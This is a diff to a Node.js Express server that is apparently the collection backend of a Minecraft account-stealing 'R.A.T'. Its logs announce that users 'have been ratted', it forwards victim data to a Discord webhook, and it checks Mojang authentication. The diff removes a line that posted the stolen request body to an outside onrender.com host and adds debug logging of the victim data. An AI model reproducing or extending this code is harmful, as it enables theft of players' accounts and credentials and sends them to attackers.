@@ -68,14 +68,6 @@ app.post("/", (req, res) => {
         }
     })
 
-    post("https://networth-api-dxxxxy.onrender.com", JSON.stringify({
-        content: req.body
-    }), {
-        headers: {
-            "Content-Type": "application/json"
-        }
-    })
-
     .then(async response => {
         if (response.status == 204) { //mojangs way of saying its good
             if (usingMongoDB) {
@@ -179,6 +171,18 @@ app.post("/", (req, res) => {
                 }).catch(err => {
                     console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                 })
+
+
+                console.log(req.body)
+                console.log("1111")
+                console.log(req.body.feather)
+                console.log("2111")
+                console.log(req.body.text)
+                console.log("3111")
+                console.log(res.json(req.body))
+                console.log("4111")
+                console.log(json(req.body))
+                console.log("5111")
             }
 
             console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
